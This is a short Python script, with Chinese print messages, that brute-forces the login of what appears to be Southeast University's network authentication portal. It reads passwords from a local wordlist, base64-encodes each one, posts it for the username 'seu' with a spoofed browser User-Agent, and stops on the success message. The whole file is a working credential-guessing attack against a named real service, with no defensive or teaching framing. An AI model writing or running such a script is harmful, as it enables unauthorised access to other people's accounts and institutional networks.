import requests
import json
import base64
import time
req = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
print("开始爆破......")
for line in open('D:\\seu.txt'):
    line = line.strip('\n')
    codestr = base64.b64encode(line.encode('UTF-8'))
    code = codestr.decode()
    #print(code)
    data = {
        'enablemacauth':	'0',
        'password':	code,
        'username':	'seu'
            }
    signin = req.post('https://w.seu.edu.cn/index.php/index/login', data = data, headers = headers)
    tjson = json.loads(signin.text)
    #print(tjson["info"])
    #t = base64.b64decode(line)
    #print(t)
    if tjson["info"] == "认证成功":
        print("认证成功      "+line)
        break


